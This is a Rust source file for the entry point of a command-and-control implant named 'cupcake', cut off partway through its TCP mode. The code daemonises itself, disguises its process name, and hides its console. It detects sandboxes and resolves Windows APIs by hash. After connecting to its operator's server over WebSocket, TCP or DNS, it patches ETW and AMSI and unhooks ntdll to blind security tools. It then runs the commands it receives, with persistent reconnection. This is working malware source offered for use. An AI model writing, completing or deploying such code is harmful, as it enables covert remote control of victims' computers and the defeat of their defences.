// C2 Client Agent - main entry
// 这是一个lightweight C2 受控端程序，通过多种传输协议连接到server. // 接收并执行命令，然后将结果返回给server. //
// 核心特性：
// - 多协议支持（WebSocket、TCP、DNS 等）
// - 条件编译：use Cargo Features 按需编译协议
// - 指数退避auto-reconnect. // - zero-panic 错误处理
// - 跨平台command exec. // - 异步 I/O
// - 可修补的server config
#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]

#[allow(unused_imports)]
use cupcake_core::{stealth, Result};
#[allow(unused_imports)]
use log::info;

#[cfg(target_os = "linux")]
fn daemonize() {
    unsafe {
        // 第一阶段 fork：创建子进程
        match libc::fork() {
            -1 => return,               // 错误
            0 => {},                    // child continues
            _ => std::process::exit(0), // parent exits
        }

        // 创建新会话，摆脱控制终端
        libc::setsid();

        // 第二阶段 fork：确保不会重新获取控制终
        match libc::fork() {
            -1 => return,
            0 => {}
            _ => std::process::exit(0),
        }

        // 重定向标准streams to /dev/null
        if let Ok(dev_null) = std::fs::File::open("/dev/null") {
            use std::os::unix::io::AsRawFd;
            let fd = dev_null.as_raw_fd();
            libc::dup2(fd, 0);
            libc::dup2(fd, 1);
            libc::dup2(fd, 2);
        }
    }
}

/// Debug-only file trace (`AGENT_TRACE=1`). Release: compile-time no-op.
#[cfg(debug_assertions)]
fn trace(msg: &str) {
    if std::env::var("AGENT_TRACE").is_ok() {
        use std::io::Write;
        if let Ok(mut f) = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open("agent_trace.log")
        {
            let _ = writeln!(f, "{}", msg);
            let _ = f.flush();
        }
    }
}

#[cfg(not(debug_assertions))]
#[inline(always)]
fn trace(_msg: &str) {}

// ================= Opt-in crash capture (feature = "diag" only) =================
#[cfg(all(target_os = "windows", feature = "diag"))]
static CRASH_LOG_HANDLE: std::sync::atomic::AtomicUsize =
    std::sync::atomic::AtomicUsize::new(0);

#[cfg(all(target_os = "windows", feature = "diag"))]
unsafe extern "system" fn crash_capture(
    info: *mut winapi::um::winnt::EXCEPTION_POINTERS,
) -> i32 {
    use std::sync::atomic::Ordering as Ordr;
    if info.is_null() {
        return 0i32;
    }
    let rec = (*info).ExceptionRecord;
    let ctx = (*info).ContextRecord;
    if rec.is_null() || ctx.is_null() {
        return 0i32;
    }
    let code = (*rec).ExceptionCode;
    let fault_addr = (*rec).ExceptionAddress as usize;
    let rip = (*ctx).Rip as usize;
    let rsp = (*ctx).Rsp as usize;
    let rbp = (*ctx).Rbp as usize;
    let rax = (*ctx).Rax as usize;
    let rbx = (*ctx).Rbx as usize;
    let rcx = (*ctx).Rcx as usize;
    let rdx = (*ctx).Rdx as usize;
    let rdi = (*ctx).Rdi as usize;
    let rsi = (*ctx).Rsi as usize;
    let r14 = (*ctx).R14 as usize;
    let r15 = (*ctx).R15 as usize;
    // For 0xC0000005: Information[0]=0 read/1 write, Information[1]=access addr
    let access_addr = if (*rec).NumberParameters >= 2 {
        (*rec).ExceptionInformation[1]
    } else {
        0
    };

    // Find which module contains RIP (PEB walk - no alloc, no std).
    let mut mod_buf = [0u8; 64];
    let (m_base, m_size) = find_module_for_va(rip, &mut mod_buf);

    // Manual hex formatting into a fixed buffer - no format!, no allocation.
    let mut buf = [0u8; 2048];
    let mut n = 0usize;
    let mut push = |s: &[u8]| {
        for &b in s {
            if n < buf.len() {
                buf[n] = b;
                n += 1;
            }
        }
    };
    push(b"CRASH code=0x");
    push(&hex_u32(code));
    push(b" fault=0x");
    push(&hex_u64(fault_addr));
    push(b" access=0x");
    push(&hex_u64(access_addr));
    push(b" rip=0x");
    push(&hex_u64(rip));
    push(b" rsp=0x");
    push(&hex_u64(rsp));
    push(b" rbp=0x");
    push(&hex_u64(rbp));
    push(b" rax=0x");
    push(&hex_u64(rax));
    push(b" rbx=0x");
    push(&hex_u64(rbx));
    push(b" rcx=0x");
    push(&hex_u64(rcx));
    push(b" rdx=0x");
    push(&hex_u64(rdx));
    push(b" rdi=0x");
    push(&hex_u64(rdi));
    push(b" rsi=0x");
    push(&hex_u64(rsi));
    push(b" r14=0x");
    push(&hex_u64(r14));
    push(b" r15=0x");
    push(&hex_u64(r15));
    push(b" in=0x");
    push(&hex_u64(m_base));
    push(b" size=0x");
    push(&hex_u64(m_size));
    push(b" mod=");
    push(&mod_buf[..mod_buf.iter().position(|&b| b == 0).unwrap_or(0)]);

    // Region report via VirtualQuery - works for manual-mapped modules too.
    let mut region = winapi::um::winnt::MEMORY_BASIC_INFORMATION {
        BaseAddress: std::ptr::null_mut(),
        AllocationBase: std::ptr::null_mut(),
        AllocationProtect: 0,
        RegionSize: 0,
        State: 0,
        Protect: 0,
        Type: 0,
    };
    push(b"\r\nregion-rip:");
    if winapi::um::memoryapi::VirtualQuery(
        rip as *const winapi::ctypes::c_void,
        &mut region,
        std::mem::size_of::<winapi::um::winnt::MEMORY_BASIC_INFORMATION>(),
    ) != 0
    {
        push(b" base=0x");
        push(&hex_u64(region.BaseAddress as usize));
        push(b" alloc=0x");
        push(&hex_u64(region.AllocationBase as usize));
        push(b" aprot=0x");
        push(&hex_u32(region.AllocationProtect));
        push(b" size=0x");
        push(&hex_u64(region.RegionSize));
        push(b" state=0x");
        push(&hex_u32(region.State));
        push(b" prot=0x");
        push(&hex_u32(region.Protect));
    } else {
        push(b" (query failed)");
    }
    // region-rip's AllocationBase = image base for a manual-mapped module;
    // saved here because `region` is re-used by later queries.
    let rip_alloc_base = region.AllocationBase as usize;
    push(b"\r\nregion-rsp:");
    if winapi::um::memoryapi::VirtualQuery(
        rsp as *const winapi::ctypes::c_void,
        &mut region,
        std::mem::size_of::<winapi::um::winnt::MEMORY_BASIC_INFORMATION>(),
    ) != 0
    {
        push(b" base=0x");
        push(&hex_u64(region.BaseAddress as usize));
        push(b" size=0x");
        push(&hex_u64(region.RegionSize));
        push(b" state=0x");
        push(&hex_u32(region.State));
        push(b" prot=0x");
        push(&hex_u32(region.Protect));
        push(b" type=0x");
        push(&hex_u32(region.Type));
    } else {
        push(b" (query failed)");
    }
    if access_addr != 0 {
        push(b"\r\nregion-access:");
        if winapi::um::memoryapi::VirtualQuery(
            access_addr as *const winapi::ctypes::c_void,
            &mut region,
            std::mem::size_of::<winapi::um::winnt::MEMORY_BASIC_INFORMATION>(),
        ) != 0
        {
            push(b" base=0x");
            push(&hex_u64(region.BaseAddress as usize));
            push(b" size=0x");
            push(&hex_u64(region.RegionSize));
            push(b" state=0x");
            push(&hex_u32(region.State));
            push(b" prot=0x");
            push(&hex_u32(region.Protect));
        } else {
            push(b" (query failed)");
        }
    }

    // Loaded image PE headers + section table at the RIP region's AllocationBase
    // (ground truth for manual-mapped layouts - no alloc, volatile reads).
    let ib = rip_alloc_base;
    if ib >= 0x1_0000 && (ib >> 48) == 0 {
        push(b"\r\nimage:");
        'img: {
                // Fresh region query at the image base (region holds the last
                // query's result - region-access - which is not the image).
                if winapi::um::memoryapi::VirtualQuery(
                    ib as *const winapi::ctypes::c_void,
                    &mut region,
                    std::mem::size_of::<winapi::um::winnt::MEMORY_BASIC_INFORMATION>(),
                ) == 0
                    || region.State != 0x1000
                    || (region.Protect & 0xFF) == 0
                {
                    push(b" noaccess");
                    break 'img;
                }
                let mut rdb = |off: usize| -> Option<u8> {
                    let a = ib + off;
                    if a < 0x1_0000 || (a >> 48) != 0 {
                        return None;
                    }
                    let ok = winapi::um::memoryapi::VirtualQuery(
                        a as *const winapi::ctypes::c_void,
                        &mut region,
                        std::mem::size_of::<winapi::um::winnt::MEMORY_BASIC_INFORMATION>(),
                    ) != 0
                        && region.State == 0x1000
                        && (region.Protect & 0xFF) != 0
                        && a < region.BaseAddress as usize + region.RegionSize;
                    if !ok {
                        return None;
                    }
                    Some(core::ptr::read_volatile(a as *const u8))
                };
                let h0 = (0..4).filter_map(|i| rdb(i)).collect::<Vec<u8>>();
                if h0.len() != 4 || h0[0] != b'M' || h0[1] != b'Z' {
                    push(b" noMZ@alloc");
                    break 'img;
                }
                let lb = (0x3C..0x40).filter_map(|i| rdb(i)).collect::<Vec<u8>>();
                if lb.len() != 4 {
                    break 'img;
                }
                let lfanew =
                    u32::from_le_bytes([lb[0], lb[1], lb[2], lb[3]]) as usize;
                let ntb = (lfanew..lfanew + 24).filter_map(|i| rdb(i)).collect::<Vec<u8>>();
                if ntb.len() != 24 || ntb[0] != b'P' || ntb[1] != b'E' {
                    push(b" noPE@lfanew");
                    break 'img;
                }
                let num_sec = u16::from_le_bytes([ntb[6], ntb[7]]) as usize;
                let opt_size = u16::from_le_bytes([ntb[20], ntb[21]]) as usize;
                push(b" lfanew=0x");
                push(&hex_u64(lfanew as usize));
                push(b" nsec=");
                push(&hex_u32(num_sec as u32));
                let opt = lfanew + 24;
                let ob = (opt..opt + 64).filter_map(|i| rdb(i)).collect::<Vec<u8>>();
                if ob.len() != 64 {
                    break 'img;
                }
                let magic = u16::from_le_bytes([ob[0], ob[1]]);
                let soi = if magic == 0x20B || magic == 0x10B {
                    u32::from_le_bytes([ob[56], ob[57], ob[58], ob[59]]) as usize
                } else {
                    0
                };
                push(b" magic=0x");
                push(&hex_u32(magic as u32));
                push(b" soi=0x");
                push(&hex_u64(soi));
                let sec0 = opt + opt_size;
                for i in 0..num_sec.min(8) {
                    let sb = (sec0 + i * 40..sec0 + i * 40 + 40)
                        .filter_map(|j| rdb(j))
                        .collect::<Vec<u8>>();
                    if sb.len() != 40 {
                        break;
                    }
                    let mut name = [b'?'; 8];
                    for j in 0..8 {
                        name[j] = if sb[j] >= 0x20 && sb[j] < 0x7F {
                            sb[j]
                        } else {
                            b'.'
                        };
                    }
                    let va = u32::from_le_bytes(sb[12..16].try_into().unwrap());
                    let vsize = u32::from_le_bytes(sb[8..12].try_into().unwrap());
                    let chars = u32::from_le_bytes(sb[36..40].try_into().unwrap());
                    push(b"\r\n  sec");
                    push(&[b'0' + i as u8]);
                    push(b" ");
                    push(&name);
                    push(b" va=0x");
                    push(&hex_u32(va));
                    push(b" vs=0x");
                    push(&hex_u32(vsize));
                    push(b" ch=0x");
                    push(&hex_u32(chars));
                }
        }
    }

    // Guarded memory dump of the frame area around rbp (volatile reads).
    push(b"\r\nrbp-dump:");
    let dump_base = rbp.wrapping_add(0x80);
    for off in (0usize..0xA0).step_by(8) {
        let addr = dump_base.wrapping_add(off);
        let mut v = 0usize;
        let ok = winapi::um::memoryapi::VirtualQuery(
            addr as *const winapi::ctypes::c_void,
            &mut region,
            std::mem::size_of::<winapi::um::winnt::MEMORY_BASIC_INFORMATION>(),
        ) != 0
            && region.State == 0x1000 /* MEM_COMMIT */
            && (region.Protect & 0xFF) != 0 /* has some read prot */
            && addr < region.BaseAddress as usize + region.RegionSize - 8;
        if ok {
            v = core::ptr::read_volatile(addr as *const usize);
            push(b" +");
            push(&hex_u64(off));
            push(b"=0x");
            push(&hex_u64(v));
        } else {
            push(b" +");
            push(&hex_u64(off));
            push(b"=??");
        }
    }

    // RBP chain walk (guarded, max 8 frames).
    push(b"\r\nrbp-chain:");
    let mut cur = rbp;
    for _ in 0..8 {
        if cur == 0 || (cur & 7) != 0 || cur < 0x1_0000 {
            push(b" end");
            break;
        }
        let ok = winapi::um::memoryapi::VirtualQuery(
            cur as *const winapi::ctypes::c_void,
            &mut region,
            std::mem::size_of::<winapi::um::winnt::MEMORY_BASIC_INFORMATION>(),
        ) != 0
            && region.State == 0x1000
            && (region.Protect & 0xFF) != 0
            && cur < region.BaseAddress as usize + region.RegionSize - 16;
        if !ok {
            push(b" ?");
            break;
        }
        let next = core::ptr::read_volatile(cur as *const usize);
        let ret = core::ptr::read_volatile((cur + 8) as *const usize);
        push(b" [");
        push(&hex_u64(cur));
        push(b":ret=0x");
        push(&hex_u64(ret));
        push(b"]");
        if next == 0 || next <= cur {
            break;
        }
        cur = next;
    }

    // Code bytes around RIP (16 before, 48 after) - resolves loaded-vs-file
    // layout questions for manual-mapped modules.
    push(b"\r\ncode-rip:");
    let code_start = rip.wrapping_sub(16);
    for k in 0usize..64 {
        let addr = code_start.wrapping_add(k);
        let ok = winapi::um::memoryapi::VirtualQuery(
            addr as *const winapi::ctypes::c_void,
            &mut region,
            std::mem::size_of::<winapi::um::winnt::MEMORY_BASIC_INFORMATION>(),
        ) != 0
            && region.State == 0x1000
            && (region.Protect & 0xFF) != 0;
        if ok {
            let b = core::ptr::read_volatile(addr as *const u8);
            push(b" ");
            push(&hex_u8(b));
        } else {
            push(b" ??");
        }
    }
    push(b"\r\n");

    let h = CRASH_LOG_HANDLE.load(Ordr::Acquire);
    if h != 0 {
        let mut written: u32 = 0;
        let _ = winapi::um::fileapi::WriteFile(
            h as winapi::um::winnt::HANDLE,
            buf.as_ptr() as *const winapi::ctypes::c_void,
            n as u32,
            &mut written,
            std::ptr::null_mut(),
        );
    }
    0i32
}

#[cfg(all(target_os = "windows", feature = "diag"))]
fn hex_u8(v: u8) -> [u8; 2] {
    const H: &[u8; 16] = b"0123456789ABCDEF";
    [H[((v >> 4) & 0xF) as usize], H[(v & 0xF) as usize]]
}

#[cfg(all(target_os = "windows", feature = "diag"))]
fn hex_u32(v: u32) -> [u8; 8] {
    const H: &[u8; 16] = b"0123456789ABCDEF";
    let mut o = [b'0'; 8];
    for i in 0..8 {
        o[7 - i] = H[((v >> (i * 4)) & 0xF) as usize];
    }
    o
}

#[cfg(all(target_os = "windows", feature = "diag"))]
fn hex_u64(v: usize) -> [u8; 16] {
    const H: &[u8; 16] = b"0123456789ABCDEF";
    let mut o = [b'0'; 16];
    for i in 0..16 {
        o[15 - i] = H[((v >> (i * 4)) & 0xF) as usize];
    }
    o
}

/// PEB module walk - find [base, size) containing `va`; copy dll name (UTF-8).
#[cfg(all(target_os = "windows", feature = "diag"))]
unsafe fn find_module_for_va(va: usize, out: &mut [u8]) -> (usize, usize) {
    #[repr(C)]
    struct UNICODE_STRING {
        length: u16,
        maximum_length: u16,
        buffer: *mut u16,
    }
    #[repr(C)]
    struct LDR_DATA_TABLE_ENTRY {
        in_load_order_links: winapi::shared::ntdef::LIST_ENTRY,
        in_memory_order_links: winapi::shared::ntdef::LIST_ENTRY,
        in_initialization_order_links: winapi::shared::ntdef::LIST_ENTRY,
        dll_base: *mut winapi::ctypes::c_void,
        entry_point: *mut winapi::ctypes::c_void,
        size_of_image: u32,
        full_dll_name: UNICODE_STRING,
        base_dll_name: UNICODE_STRING,
    }
    let peb: *const usize;
    std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
    let ldr = *(peb.add(3) as *const *const usize);
    let list_head = if cfg!(target_arch = "x86_64") {
        ldr.add(4)
    } else {
        ldr.add(5)
    } as *mut winapi::shared::ntdef::LIST_ENTRY;
    let mut node = (*list_head).Flink;
    while node != list_head {
        let entry_ptr = if cfg!(target_arch = "x86_64") {
            (node as *const u8).sub(16)
        } else {
            (node as *const u8).sub(8)
        };
        let entry = entry_ptr as *const LDR_DATA_TABLE_ENTRY;
        let base = (*entry).dll_base as usize;
        let size = (*entry).size_of_image as usize;
        if base != 0 && size != 0 && va >= base && va < base + size {
            let b = (*entry).base_dll_name.buffer;
            let len = ((*entry).base_dll_name.length as usize / 2).min(63);
            if !b.is_null() {
                for i in 0..len {
                    let c = *b.add(i);
                    out[i] = if c < 128 { c as u8 } else { b'?' };
                }
                out[len] = 0;
            }
            return (base, size);
        }
        node = (*node).Flink;
    }
    (0, 0)
}

/// Crash capture is opt-in only (`diag` feature + `AGENT_ALLOW_DIAG=1`).
/// Product builds never compile this path (no fixed crash.log, no VEH install).
#[cfg(all(target_os = "windows", feature = "diag"))]
fn install_crash_capture() {
    let allow = std::env::var("AGENT_ALLOW_DIAG")
        .map(|v| v == "1" || v.eq_ignore_ascii_case("true"))
        .unwrap_or(false);
    if !allow {
        return;
    }
    unsafe {
        // Path under TEMP with random name - never a fixed developer path.
        let mut rnd = [0u8; 4];
        let _ = getrandom::getrandom(&mut rnd);
        let name = format!(
            "diag_{:08x}.log",
            u32::from_le_bytes(rnd)
        );
        let path_os = std::env::temp_dir().join(name);
        let path_str = path_os.to_string_lossy().to_string();
        use winapi::um::winnt::{FILE_APPEND_DATA, FILE_SHARE_READ, FILE_SHARE_WRITE};
        let path = widestring::U16CString::from_str(&path_str).unwrap_or_default();
        let h = winapi::um::fileapi::CreateFileW(
            path.as_ptr(),
            FILE_APPEND_DATA,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            std::ptr::null_mut(),
            winapi::um::fileapi::OPEN_ALWAYS,
            winapi::um::winnt::FILE_ATTRIBUTE_NORMAL,
            std::ptr::null_mut(),
        );
        if h != -1isize as _ {
            CRASH_LOG_HANDLE.store(h as usize, std::sync::atomic::Ordering::Release);
        }
        winapi::um::errhandlingapi::AddVectoredExceptionHandler(1, Some(crash_capture));
        winapi::um::errhandlingapi::SetUnhandledExceptionFilter(Some(crash_capture));
    }
}
// ================= END TEMP DIAG =================

fn main() {
    trace("enter main");
    // 🚀 Linux 自主background (Daemonization)
    #[cfg(target_os = "linux")]
    daemonize();

    // Diagnostics: release ignores RUST_LOG unless AGENT_ALLOW_DIAG=1
    let logging_enabled = {
        let allow = std::env::var("AGENT_ALLOW_DIAG")
            .map(|v| v == "1" || v.eq_ignore_ascii_case("true"))
            .unwrap_or(false);
        if cfg!(debug_assertions) {
            true
        } else if allow {
            std::env::var("RUST_LOG").is_ok()
        } else {
            false
        }
    };

    if logging_enabled {
        #[cfg(target_os = "windows")]
        stealth::setup_diagnostic_console();

        // Initialize env_logger only when the `logging` feature is compiled in.
        #[cfg(feature = "logging")]
        {
            env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info"))
                .init();
        }
    }

    // 💥 Global Panic Hook
    std::panic::set_hook(Box::new(|info| {
        trace(&format!("PANIC: {:?}", info));
        log::error!("PANIC OCCURRED: {:?}", info);
    }));
    trace("panic hook set");

    // Opt-in crash capture (feature=diag + AGENT_ALLOW_DIAG=1 only).
    #[cfg(all(target_os = "windows", feature = "diag"))]
    install_crash_capture();
    trace("crash capture path checked");

    // Seed PRNG
    let seed = match std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH) {
        Ok(d) => d.as_nanos() as u64,
        Err(_) => 0x1337BEEF1337BEEF_u64,
    };
    cupcake_core::utils::seed_rng(seed);
    trace("rng seeded");

    // EVASION: organic inter-phase jitter (variable ranges break fixed API cadence).
    stealth::small_jitter_sleep();

    // 3. [Debug] DON'T Hide Console if logging is active
    if !logging_enabled {
        trace("before hide_console");
        stealth::hide_console();
        trace("after hide_console");
    } else {
        trace("diag mode: hide_console skipped");
        log::info!("hide_console skipped (diag mode)");
    }

    stealth::small_jitter_sleep();

    // Anti-analysis: degrade (longer quiet / skip high-risk modules), never hard-exit.
    if stealth::check_environment() {
        stealth::enter_degraded_mode();
        trace("degraded mode entered");
    }

    // EVASION: ETW/AMSI/ntdll-unhook deferred to post-connection; CFG deferred to
    // first Manual-Map (`ensure_cfg_relaxed` in pe_map) so startup has no memory patches.
    stealth::medium_jitter_sleep();

    // 5. COM Initialization for PTY support (dynamic resolve - no combase IAT)
    // Order vs env-check already jittered; occasional skip of COM until later is not
    // viable for PTY, but we keep a pre/post medium pause.
    #[cfg(target_os = "windows")]
    {
        trace("before COM init");
        unsafe {
            // COINIT_MULTITHREADED = 0x0
            // Console agents often lack ole32/combase until LoadLibrary.
            type CoInitializeExFn =
                unsafe extern "system" fn(*mut winapi::ctypes::c_void, u32) -> i32;
            let mut done = false;
            for dll in [b"combase.dll".as_slice(), b"ole32.dll".as_slice()] {
                let base = cupcake_core::stealth::ensure_module_base(
                    dll,
                    cupcake_core::stealth::hash_module_name(dll),
                );
                if base == 0 {
                    continue;
                }
                if let Some(addr) = cupcake_core::stealth::get_api_addr(
                    base,
                    cupcake_core::stealth::hash_api_name(b"CoInitializeEx"),
                ) {
                    let f: CoInitializeExFn = std::mem::transmute(addr);
                    let _ = f(std::ptr::null_mut(), 0);
                    done = true;
                    break;
                }
            }
            if !done {
                cupcake_core::db_print!("[WARN] CoInitializeEx not resolved");
            }
        }
        trace("after COM init");
    }

    // Heavier pause before thread create (breaks init → CreateThread chain).
    stealth::medium_jitter_sleep();

    // 9. Backgrounding and Name Spoofing (Linux)
    // Phase 1 Enhancement: Use randomized kworker name instead of fixed name
    #[cfg(target_os = "linux")]
    {
        // Use empty string to trigger random name generation
        stealth::spoof_process_name("");
    }

    // 11. Spawn agent runtime thread
    #[cfg(target_os = "windows")]
    {
        unsafe extern "system" fn agent_thread_proc(_: *mut winapi::ctypes::c_void) -> u32 {
            trace("thread proc enter");
            let rt = match build_runtime() {
                Ok(r) => {
                    trace("runtime built");
                    r
                }
                Err(e) => {
                    trace(&format!("runtime build FAILED: {}", e));
                    cupcake_core::db_print!(
                        "[FATAL] Failed to create tokio runtime: {}",
                        e
                    );
                    return 1;
                }
            };

            trace("before run()");
            rt.block_on(async {
                if let Err(e) = run().await {
                    trace(&format!("run() returned err: {:?}", e));
                    cupcake_core::db_print!(
                        "[FATAL] Agent run loop failed: {:?}",
                        e
                    );
                }
            });
            trace("after run()");

            0
        }

        // EVASION: create_thread_ex randomizes NtCreateThreadEx vs CreateThread 50/50.
        // stack_size=0 - OS default (do NOT pass large commit with 0 reserve:
        // Server 2012 R2 / Win8.1 reject or mis-handle commit>reserve).
        trace("before create_thread_ex");
        let h_thread = match cupcake_core::native::create_thread_ex(
            agent_thread_proc,
            std::ptr::null_mut(),
            0,
        ) {
            Ok(h) => {
                trace(&format!("create_thread_ex ok h={:#x}", h));
                h
            }
            Err(e) => {
                trace(&format!("create_thread_ex FAILED: {}", e));
                cupcake_core::db_print!("[FATAL] thread create failed: {}", e);
                return;
            }
        };

        // Wait indefinitely for agent thread
        trace("before wait_for_single_object");
        cupcake_core::native::wait_for_single_object(h_thread);
        trace("after wait_for_single_object");
        let _ = cupcake_core::native::close_handle(h_thread);
    }
    #[cfg(not(target_os = "windows"))]
    {
        let rt = match build_runtime() {
            Ok(r) => r,
            Err(_) => return,
        };
        rt.block_on(async {
            let _ = run().await;
        });
    }
}

/// Build Tokio runtime: multi-thread when `rt-multi` feature is on, else current-thread (smaller).
fn build_runtime() -> std::result::Result<tokio::runtime::Runtime, std::io::Error> {
    #[cfg(feature = "rt-multi")]
    {
        tokio::runtime::Builder::new_multi_thread()
            .enable_all()
            .build()
    }
    #[cfg(not(feature = "rt-multi"))]
    {
        tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
    }
}

/// 主运行逻辑
async fn run() -> Result<()> {
    // 💤 Startup delay — **only** the value from server generate/build (`sleep_time`).
    // Source: SLEEP_SECS / SLEEP_TIME_TEMPLATE (Builder injects panel sleep_time).
    // 0 = connect immediately. Override: AGENT_SKIP_SANDBOX_SLEEP=1 or AGENT_ALLOW_DIAG=1.
    // (No extra random anti-sandbox wait — operators control delay from the panel.)
    {
        let skip = std::env::var("AGENT_SKIP_SANDBOX_SLEEP")
            .map(|v| v == "1" || v.eq_ignore_ascii_case("true"))
            .unwrap_or(false)
            || std::env::var("AGENT_ALLOW_DIAG")
                .map(|v| v == "1" || v.eq_ignore_ascii_case("true"))
                .unwrap_or(false);
        if !skip {
            let sleep_secs = cupcake_core::config::get_sleep_time();
            if sleep_secs > 0 {
                cupcake_core::db_print!(
                    "[*] startup sleep {}s (from server sleep_time)",
                    sleep_secs
                );
                #[cfg(feature = "net")]
                {
                    tokio::time::sleep(tokio::time::Duration::from_secs(sleep_secs)).await;
                }
                #[cfg(not(feature = "net"))]
                {
                    std::thread::sleep(std::time::Duration::from_secs(sleep_secs));
                }
            }
        }
    }

    // 🆔 预计算并缓存 Agent UUID
    cupcake_core::get_agent_uuid();

    // 1️⃣ WebSocket Entry Point
    #[cfg(feature = "ws")]
    {
        return run_websocket_mode().await;
    }

    // 2️⃣ TCP Entry Point (Medium Priority)
    #[cfg(all(feature = "tcp", not(feature = "ws")))]
    {
        return run_tcp_mode().await;
    }

    // 3️⃣ DNS Entry Point (Lowest Priority)
    #[cfg(all(
        feature = "dns",
        not(any(feature = "ws", feature = "tcp", feature = "tcp_bind"))
    ))]
    {
        return run_dns_mode().await;
    }

    // 4️⃣ TCP Bind Entry Point (New)
    #[cfg(feature = "tcp_bind")]
    {
        info!("Running in TCP Bind (Forward) mode");
        return run_bind_mode().await;
    }

    // ⚠️ Safety check: What if no feature is selected?
    #[cfg(not(any(feature = "ws", feature = "tcp", feature = "dns", feature = "tcp_bind")))]
    {
        return Err(ClientError::ConnectionError("no_protocol".to_string()));
    }
}

/// WebSocket 模式运行逻辑
#[cfg(feature = "ws")]
#[allow(dead_code)]
async fn run_websocket_mode() -> Result<()> {
    use cupcake_core::config::{get_server_url, validate_server_url};
    use cupcake_core::fallback::{FallbackManager, FallbackState};
    use cupcake_core::transport::create_transport;
    use cupcake_core::{ClientError, Transport};

    let server_url = get_server_url();
    trace(&format!("ws mode: server_url={}", server_url));
    // println!("[*] Target C2 Server: {}", server_url);

    if !validate_server_url(&server_url) {
        trace("ws mode: URL validation FAILED");
        return Err(ClientError::ConnectionError("invalid_target".to_string()));
    }

    let mut transport: Box<dyn Transport> = match create_transport(&server_url) {
        Ok(t) => {
            trace("ws mode: transport created");
            t
        }
        Err(e) => {
            trace(&format!("ws mode: transport create FAILED: {:?}", e));
            return Err(e);
        }
    };

    // Phase 3: Initialize Fallback Manager
    let mut fallback = FallbackManager::new();

    // 使用指数退避重连策略（1s -> 2s -> 4s -> ... -> 60s
    let mut backoff = cupcake_core::ExponentialBackoff::new();

    loop {
        // Phase 3: Check fallback state and adapt
        let current_url = match fallback.state() {
            FallbackState::Primary => server_url.clone(),
            FallbackState::DnsBackup => {
                if let Some(dns_url) = fallback.switch_to_fallback() {
                    dns_url
                } else {
                    server_url.clone()
                }
            }
            FallbackState::WaitingRecovery => {
                // Wait before recovery attempt
                let recovery_delay = fallback.recovery_delay_secs();
                log::info!("Waiting {}s before recovery attempt", recovery_delay);
                tokio::time::sleep(tokio::time::Duration::from_secs(recovery_delay)).await;

                if let Some(primary_url) = fallback.attempt_recovery() {
                    // Recreate transport for recovery
                    match create_transport(&primary_url) {
                        Ok(t) => {
                            transport = t;
                            primary_url
                        }
                        Err(_) => {
                            continue;
                        }
                    }
                } else {
                    server_url.clone()
                }
            }
        };

        if let Err(e) = transport.connect().await {
            trace(&format!("ws mode: connect failed: {e:?}"));
            // Phase 3: Primary failed - try fallback
            if *fallback.state() == FallbackState::Primary {
                if let Some(_fallback_url) = fallback.switch_to_fallback() {
                    #[cfg(feature = "dns")]
                    {
                        log::info!("Switching to DNS backup channel");
                        match create_transport(&fallback_url) {
                            Ok(t) => {
                                transport = t;
                                backoff.reset();
                                continue;
                            }
                            Err(_) => {
                                log::warn!("Fallback channel also failed");
                            }
                        }
                    }
                }
            }

            // 连接失败：使用指数退避等
            tokio::time::sleep(backoff.next_delay()).await;
            continue;
        }

        // Phase 3: Mark as recovered if on primary
        if *fallback.state() == FallbackState::Primary {
            fallback.mark_recovered();
        }

        // 连接成功：重置退避计时器
        backoff.reset();
        trace(&format!("ws mode: CONNECTED to {}", current_url));

        // NOTE: Do not call kick_process_cache_refresh here. On this host, Toolhelp
        // enumeration (even on a helper thread) was observed to freeze the agent
        // process after connect. process_list uses a non-blocking cache snapshot
        // and always includes self; full enum can be re-enabled via APP_PROCESS_FULL=1
        // once a safe Toolhelp path is validated.

        // EVASION: anti-instrumentation AFTER connection + extra quiet window.
        // - CFG: NOT here — deferred to first Manual-Map (`ensure_cfg_relaxed`).
        // - ETW/AMSI/ntdll-unhook: feature-gated + skipped in degraded mode.
        // - post_connect_patch_delay separates C2 beacon from memory modification.
        #[cfg(target_os = "windows")]
        {
            cupcake_core::stealth::post_connect_patch_delay().await;
            if !stealth::is_degraded() {
                trace("post-connect: applying evasion patches");
                #[cfg(feature = "ntdll-unhook")]
                unsafe {
                    let _ = stealth::unhook_ntdll();
                }
                stealth::small_jitter_sleep();
                #[cfg(feature = "etw-patch")]
                unsafe {
                    stealth::patch_etw();
                }
                stealth::small_jitter_sleep();
                #[cfg(feature = "amsi-patch")]
                unsafe {
                    stealth::patch_amsi();
                }
                stealth::medium_jitter_sleep();
                trace("post-connect: evasion patches applied");
            } else {
                trace("post-connect: degraded — skip high-risk patches");
            }
        }

        #[cfg(feature = "plugin")]
        let run_result = {
            let handler = cupcake_core::BatchMessageHandler::new(transport, None);
            handler.run().await
        };
        #[cfg(not(feature = "plugin"))]
        let run_result = {
            let handler = cupcake_core::MessageHandler::new(transport);
            handler.run().await
        };

        // Session ended - clear staged worker PE / supervisor bookkeeping.
        cupcake_core::module_supervisor::supervisor().stop_all();

        match run_result {
            Ok(returned_transport) => {
                transport = returned_transport;
                // Connection dropped but recovered - mark primary as recovered
                fallback.mark_recovered();
            }
            Err(_e) => {
                // Phase 3: Session error - may need fallback
                fallback.switch_to_fallback();

                match create_transport(&current_url) {
                    Ok(t) => transport = t,
                    Err(e) => return Err(e),
                }
            }
        }
        // Session 断开：抖动重连间隔（±30% around 2s
        let delay = cupcake_core::backoff::apply_delay_jitter(
            std::time::Duration::from_secs(2),
            30,
        );
        tokio::time::sleep(tokio::time::Duration::from_millis(delay.as_millis() as u64)).await;
    }
}

/// TCP 模式运行逻辑
#[cfg(feature = "tcp")]
#[allow(dead_code)]
async fn run_tcp_mode() -> Result<()> {
    use cupcake_core::config::get_server_url;
    use cupcake_core::handler::MessageHandler;
    use cupcake_core::transport::{create_transport, Transport};

    let server_url = get_server_url();
    let mut clean_url = server_url.clone();

    if clean_url.starts_with("ws://") {
        clean_url = clean_url.replace("ws://", "");
    } else if clean_url.starts_with("wss://") {
        clean_url = clean_url.replace("wss://", "");
    } else if clean_url.starts_with("tcp://") {
        clean_url = clean_url.replace("tcp://", "");
    }

